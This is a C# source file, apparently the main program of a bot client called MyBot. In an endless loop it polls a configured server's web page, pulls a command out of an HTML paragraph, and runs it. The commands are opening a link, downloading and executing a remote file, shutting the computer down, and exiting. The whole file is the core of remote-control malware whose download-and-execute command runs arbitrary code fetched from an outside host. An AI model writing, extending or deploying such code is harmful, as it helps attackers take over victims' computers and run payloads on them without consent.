using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;

namespace MyBot
{
    class Program
    {
        static string last_cmd = string.Empty;
        static void Main(string[] args)
        {
            while(true)
            {
                string html = Web.GetHTML(Configs.server);
                Match regx = Regex.Match(html, "<p>(.*)</p></article>");
                string content = regx.Groups[1].Value;

                if (last_cmd == content)
                {
                    Thread.Sleep(Configs.delay);
                    continue;
                }
                last_cmd = content;
                Cmd command = new Cmd(content);
                Execute(command);
                Thread.Sleep(Configs.delay);

            }
        }

        static void Execute(Cmd cmd)
        {
            switch (cmd.ComType)
            {
                case "open_link":
                    Functions.OpenLink(cmd.ComContent);
                    break;

                case "download_execute":
                    Functions.DownloadExecute(cmd.ComContent);
                    break;

                case "shutdown":
                    Functions.ShutdownComputer();
                    break;

                case "exit":
                    Environment.Exit(0);
                    break;
            }
        }
    }
}
